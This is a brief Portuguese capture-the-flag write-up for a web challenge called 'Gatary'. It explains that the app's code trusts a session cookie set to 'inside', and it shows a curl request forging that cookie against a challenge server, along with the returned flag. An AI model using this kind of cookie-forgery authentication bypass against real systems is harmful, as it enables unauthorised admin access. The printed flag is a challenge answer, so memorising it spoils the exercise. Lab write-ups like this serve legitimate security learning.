...
O arquivo app/index.ts espera o cookie estar definido com 'inside' na linha 65 do codigo como inside entao se voce definir o cookie como inside voce consegue logar como admin

||
```bash
┌──(t0x1n㉿t0x1n-Desktop)-[~/…/CTF/CyberApocalpise/Gatary/challenge]
└─$ curl -sS -X POST "http://154.57.164.80:31771/api/flag"  -H 'Cookie: session=inside' | jq .
{
  "ok": true,
  "flag": "HTB{w3lc0me_b3y0nd_th3_g4t3_0d76e2eee84e905c15aa29cedbf36b82}"
}
```
||

<img width="1547" height="127" alt="image" src="https://github.com/user-attachments/assets/0b88310d-bd7f-4d4b-b130-47e08dae40ea" />
